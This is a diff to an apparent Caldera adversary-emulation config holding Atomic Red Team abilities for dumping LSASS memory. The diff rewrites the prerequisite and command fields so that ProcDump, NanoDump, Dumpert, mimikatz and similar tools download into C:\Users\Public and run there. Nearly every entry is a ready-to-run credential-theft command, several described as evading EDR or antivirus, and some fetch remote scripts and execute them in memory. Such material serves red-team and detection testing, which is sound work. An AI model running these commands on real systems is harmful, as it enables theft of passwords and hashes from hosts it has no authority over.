@@ -11,16 +11,14 @@
             "ability_id": "3ae905fe6171f9d0fbefd9cb6b8d6a82",
             "name": "Dump LSASS.exe Memory using ProcDump",
             "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
-            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\" -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
-            "kali_prereq": "if [ -f \"$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe\" ]; then echo \"ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe\"; else mkdir -p $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && \\\nwget -q \"https://download.sysinternals.com/files/Procdump.zip\" -O /tmp/Procdump.zip && \\\nunzip -o /tmp/Procdump.zip -d /tmp/Procdump && \\\ncp /tmp/Procdump/procdump64.exe $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe && \\\nrm -rf /tmp/Procdump.zip /tmp/Procdump && \\\nsudo systemctl restart caldera; fi",
-            "win_prereq": ""
+            "command": "\"C:\\Users\\Public\\procdump.exe\" -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
+            "win_prereq": "if (Test-Path \"C:\\Users\\Public\\procdump.exe\") { Write-Host \"ALREADY_PRESENT: C:\\Users\\Public\\procdump.exe\" } else { Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/Procdump.zip' -OutFile 'C:\\Users\\Public\\payload.zip'; Expand-Archive -Path 'C:\\Users\\Public\\payload.zip' -DestinationPath 'C:\\Users\\Public\\payload_extract' -Force; Copy-Item 'C:\\Users\\Public\\payload_extract\\procdump64.exe' 'C:\\Users\\Public\\procdump.exe' -Force; Remove-Item 'C:\\Users\\Public\\payload.zip' -Force; Remove-Item 'C:\\Users\\Public\\payload_extract' -Recurse -Force }"
           },
           {
             "ability_id": "35d92515122effdd73801c6ac3021da7",
             "name": "Dump LSASS.exe Memory using comsvcs.dll",
             "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-comsvcs.dmp.\n",
             "command": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full",
-            "kali_prereq": "",
             "win_prereq": ""
           },
           {
@@ -28,7 +26,6 @@
             "name": "Dump LSASS.exe using imported Microsoft DLLs",
             "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by\nimporting built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump \nfile and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-xordump.t1003.001.dmp.\n",
             "command": "if (Test-Path 'C:\\Windows\\Temp\\xordump.exe') { ; } else {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest \"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\" -OutFile C:\\Windows\\Temp\\xordump.exe};  ;  C:\\Windows\\Temp\\xordump.exe -out C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -x 0x41",
-            "kali_prereq": "",
             "win_prereq": ""
           },
           {
@@ -36,47 +33,41 @@
             "name": "Dump LSASS.exe Memory using Out-Minidump.ps1",
             "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure\npowershell implementation that leverages the MiniDumpWriteDump Win32 API call.\nUpon successful execution, you should see the following file created $env:TEMP\\lsass_*.dmp.\n\nAuthor of Out-Minidump: Matthew Graeber (@mattifestation)\n",
             "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null; try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}; catch{ $_; exit $_.Exception.Response.StatusCode.Value__}; get-process lsass | Out-Minidump",
-            "kali_prereq": "",
             "win_prereq": ""
           },
           {
             "ability_id": "505f7b839938e8cea8db2dc9a4448f57",
             "name": "Dump LSASS.exe Memory through Silent Process Exit",
             "description": "WerFault.exe (Windows Error Reporting process that handles process crashes) can be abused to create a \nmemory dump of lsass.exe, in a directory of your choice. This method relies on a mechanism \nintroduced in Windows 7 called Silent Process Exit, which provides the ability to trigger\nspecific actions for a monitored process in one of two scenarios; either the process terminates\nitself by calling ExitProcess(), or another process terminates it via the TerminateProcess() API. \nThe major advantage of this technique is that it does not cause lsass.exe to crash, and since \nWerFault.exe is used to create file dumps all the time (not just lsass.exe), this method provides \nthe added advantage of going undetected. WerFault.exe is a process known for dumping every crashing process, \nfrom an attacker standpoint this is appealing as their illicit credential extraction will \nappear benign because from a defender’s viewpoint it’s within the realm of normal activity.\n\nUpon successful execution, you should find the dump file in directory of your choice or \"%temp%\\SilentProcessExit\" by default.\n",
-            "command": "PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe --silent-process-exit \"%temp%\\SilentProcessExit\"",
-            "kali_prereq": "if [ -f \"$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/nanodump.x64.exe\" ]; then echo \"ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/nanodump.x64.exe\"; else mkdir -p $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && \\\nwget -q \"https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\" -O $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/nanodump.x64.exe && \\\nsudo systemctl restart caldera; fi",
-            "win_prereq": ""
+            "command": "\"C:\\Users\\Public\\nanodump.x64.exe\" --silent-process-exit \"%temp%\\SilentProcessExit\"",
+            "win_prereq": "if (Test-Path \"C:\\Users\\Public\\nanodump.x64.exe\") { Write-Host \"ALREADY_PRESENT: C:\\Users\\Public\\nanodump.x64.exe\" } else { Invoke-WebRequest -Uri 'https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe' -OutFile 'C:\\Users\\Public\\nanodump.x64.exe' }"
           },
           {
             "ability_id": "54643bf2018c940ca5fc21097884d2d4",
             "name": "Create Mini Dump of LSASS.exe using ProcDump",
             "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump. This particular method uses -mm to produce a mini dump of lsass.exe\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
-            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\" -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
-            "kali_prereq": "if [ -f \"$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe\" ]; then echo \"ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe\"; else mkdir -p $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && \\\nwget -q \"https://download.sysinternals.com/files/Procdump.zip\" -O /tmp/Procdump.zip && \\\nunzip -o /tmp/Procdump.zip -d /tmp/Procdump && \\\ncp /tmp/Procdump/procdump64.exe $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe && \\\nrm -rf /tmp/Procdump.zip /tmp/Procdump && \\\nsudo systemctl restart caldera; fi",
-            "win_prereq": ""
+            "command": "\"C:\\Users\\Public\\procdump.exe\" -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
+            "win_prereq": "if (Test-Path \"C:\\Users\\Public\\procdump.exe\") { Write-Host \"ALREADY_PRESENT: C:\\Users\\Public\\procdump.exe\" } else { Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/Procdump.zip' -OutFile 'C:\\Users\\Public\\payload.zip'; Expand-Archive -Path 'C:\\Users\\Public\\payload.zip' -DestinationPath 'C:\\Users\\Public\\payload_extract' -Force; Copy-Item 'C:\\Users\\Public\\payload_extract\\procdump64.exe' 'C:\\Users\\Public\\procdump.exe' -Force; Remove-Item 'C:\\Users\\Public\\payload.zip' -Force; Remove-Item 'C:\\Users\\Public\\payload_extract' -Recurse -Force }"
           },
           {
             "ability_id": "990a4629d154622098b70ba50384051f",
             "name": "Dump LSASS.exe Memory using NanoDump",
             "description": "The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.\n\nhttps://github.com/helpsystems/nanodump\n\nUpon successful execution, you should find the nanondump.dmp file in the temp directory\n",
-            "command": "PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe -w \"%temp%\\nanodump.dmp\"",
-            "kali_prereq": "if [ -f \"$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/nanodump.x64.exe\" ]; then echo \"ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/nanodump.x64.exe\"; else mkdir -p $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && \\\nwget -q \"https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\" -O $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/nanodump.x64.exe && \\\nsudo systemctl restart caldera; fi",
-            "win_prereq": ""
+            "command": "\"C:\\Users\\Public\\nanodump.x64.exe\" -w \"%temp%\\nanodump.dmp\"",
+            "win_prereq": "if (Test-Path \"C:\\Users\\Public\\nanodump.x64.exe\") { Write-Host \"ALREADY_PRESENT: C:\\Users\\Public\\nanodump.x64.exe\" } else { Invoke-WebRequest -Uri 'https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe' -OutFile 'C:\\Users\\Public\\nanodump.x64.exe' }"
           },
           {
             "ability_id": "03455985e8bf5d2ee43947cadaca2256",
             "name": "Dump LSASS.exe Memory using direct system calls and API unhooking",
             "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf you see a message saying \\\"The system cannot find the path specified.\\\", try using the  get-prereq_commands to download the  tool first.\n",
-            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\Outflank-Dumpert.exe\"",
-            "kali_prereq": "if [ -f \"$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/Outflank-Dumpert.exe\" ]; then echo \"ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/Outflank-Dumpert.exe\"; else mkdir -p $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && \\\nwget -q \"https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe\" -O $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/Outflank-Dumpert.exe && \\\nsudo systemctl restart caldera; fi",
-            "win_prereq": ""
+            "command": "\"C:\\Users\\Public\\Outflank-Dumpert.exe\"",
+            "win_prereq": "if (Test-Path \"C:\\Users\\Public\\Outflank-Dumpert.exe\") { Write-Host \"ALREADY_PRESENT: C:\\Users\\Public\\Outflank-Dumpert.exe\" } else { Invoke-WebRequest -Uri 'https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe' -OutFile 'C:\\Users\\Public\\Outflank-Dumpert.exe' }"
           },
           {
             "ability_id": "8e01631039faf6a9a84df376bf9ad0f1",
             "name": "Dump LSASS with createdump.exe from .Net v5",
             "description": "Use createdump executable from .NET to create an LSASS dump.\n\n[Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)\n",
             "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"; & \"$exePath\" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id",
-            "kali_prereq": "",
             "win_prereq": "if (Test-Path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\") { Write-Host \"ALREADY_PRESENT: $env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\" } else { $url = \"https://download.visualstudio.microsoft.com/download/pr/a0832b5a-6900-442b-af79-6ffddddd6ba4/e2df0b25dd851ee0b38a86947dd0e42e/dotnet-runtime-5.0.17-win-x64.exe\"; $out = \"$env:Temp\\dotnet-runtime-5.0.17.exe\"; Invoke-WebRequest -Uri $url -OutFile $out; Start-Process -FilePath $out -ArgumentList \"/install /quiet /norestart\" -Wait; Remove-Item $out -Force }"
           },
           {
@@ -84,24 +75,21 @@
             "name": "Leverage Procdump for lsass memory",
             "description": "Dump lsass for later use with mimikatz",
             "command": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;",
-            "kali_prereq": "",
             "win_prereq": ""
           },
           {
             "ability_id": "7d1c6222726c67b13740450275dc2162",
             "name": "LSASS read with pypykatz",
             "description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple usernames and passwords/hashes to the screen.\n\nWill create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.\n",
-            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz\" live lsa",
-            "kali_prereq": "if [ -f \"$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/pypykatz\" ]; then echo \"ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/pypykatz\"; else pip3 install pypykatz && cp -r $(python3 -c \"import pypykatz, os; print(os.path.dirname(pypykatz.__file__))\") $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/pypykatz && sudo systemctl restart caldera; fi",
-            "win_prereq": "if (Test-Path \"$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/pypykatz\") { Write-Host \"ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/pypykatz\" } else { invoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait }"
+            "command": "pypykatz live lsa",
+            "win_prereq": "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe' -OutFile 'C:\\Users\\Public\\python_setup.exe'; Start-Process -FilePath 'C:\\Users\\Public\\python_setup.exe' -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1 Include_test=0' -Wait; Remove-Item 'C:\\Users\\Public\\python_setup.exe' -Force; $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User'); pip install pypykatz"
           },
           {
             "ability_id": "7e8ccbe3de961012b6464485829e87a4",
             "name": "Offline Credential Theft With Mimikatz",
             "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n",
-            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe\" \"sekurlsa::minidump %tmp%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit",
-            "kali_prereq": "if [ -f \"$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64/mimikatz.exe\" ]; then echo \"ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64/mimikatz.exe\"; else mkdir -p $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64 && \\\nwget -q \"https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip\" -O /tmp/mimikatz.zip && \\\nunzip -o /tmp/mimikatz.zip -d /tmp/mimikatz && \\\ncp /tmp/mimikatz/x64/mimikatz.exe $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64/mimikatz.exe && \\\nrm -rf /tmp/mimikatz.zip /tmp/mimikatz && \\\nsudo systemctl restart caldera; fi",
-            "win_prereq": ""
+            "command": "\"C:\\Users\\Public\\x64\\mimikatz.exe\" \"sekurlsa::minidump %tmp%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit",
+            "win_prereq": "if (Test-Path \"C:\\Users\\Public\\x64\\mimikatz.exe\") { Write-Host \"ALREADY_PRESENT: C:\\Users\\Public\\x64\\mimikatz.exe\" } else { New-Item -ItemType Directory -Force -Path 'C:\\Users\\Public\\x64'; Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip' -OutFile 'C:\\Users\\Public\\payload.zip'; Expand-Archive -Path 'C:\\Users\\Public\\payload.zip' -DestinationPath 'C:\\Users\\Public\\payload_extract' -Force; Copy-Item 'C:\\Users\\Public\\payload_extract\\x64\\mimikatz.exe' 'C:\\Users\\Public\\x64\\mimikatz.exe' -Force; Remove-Item 'C:\\Users\\Public\\payload.zip' -Force; Remove-Item 'C:\\Users\\Public\\payload_extract' -Recurse -Force }"
           }
         ]
       }
